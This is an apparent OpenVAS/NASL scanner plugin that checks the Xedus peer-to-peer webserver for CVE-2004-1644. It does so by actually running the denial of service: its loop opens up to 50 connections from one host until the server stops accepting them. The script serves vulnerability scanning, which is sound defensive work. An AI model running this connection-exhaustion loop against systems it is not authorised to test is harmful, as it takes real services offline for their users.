# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14646");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2004-1644");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11071");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Xedus DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_family("Peer-To-Peer File Sharing");
  script_dependencies("xedus_detect.nasl");
  script_require_ports("Services/www", 4274);
  script_mandatory_keys("xedus/running");

  script_tag(name:"solution", value:"Upgrade to the latest version.");

  script_tag(name:"impact", value:"An attacker could stop the webserver accepting requests from users by
  establishing multiple connections from the same host.");

  script_tag(name:"summary", value:"The remote host runs Xedus Peer to Peer webserver. This version is vulnerable
  to a denial of service.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:4274);
if(!get_kb_item("xedus/" + port + "/running"))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

s[0] = soc;

for(i = 1; i < 50; i++) {

  soc = open_sock_tcp(port);
  if(!soc) {
    security_message(port:port);
    for(j = 0; j < i; j++)
      close(s[j]);
  }
  sleep(1);
  s[i] = soc;
}

for(j = 0; j < i; j++) {
  if(s[j])
    close(s[j]);
}

exit(0);
